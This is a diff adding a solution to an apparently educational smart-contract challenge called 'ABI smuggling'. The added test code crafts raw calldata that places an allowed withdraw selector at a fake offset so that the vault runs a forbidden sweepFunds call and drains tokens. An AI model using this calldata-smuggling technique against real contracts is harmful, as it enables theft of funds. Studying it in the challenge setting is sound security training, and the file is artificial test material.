@@ -45,6 +45,28 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // 0x85fb709d -> sweepFunds(address,address), allowed to deployer
+        // 0xd9caed12 -> withdraw(address,address,uint256), allowed to player
+
+        function toHex(addr) {
+            return addr.replace("0x", "").toLowerCase().padStart(64, '0')
+        }
+
+        let actionData = '85fb709d' + toHex(recovery.address) + toHex(token.address);
+
+        let data = "0x1cff79cd" + toHex(vault.address) +
+            toHex("0x80") /* offset */ + toHex("0x00") + "d9caed12".padEnd(64, '0') /* injected selector */ +
+            toHex((actionData.length / 2).toString(16)) + actionData;
+            
+
+        let tx = await player.sendTransaction({
+            to: vault.address,
+            data: data,
+            gasLimit: 100000
+        });
+
+        await tx.wait();
     });
 
     after(async function () {
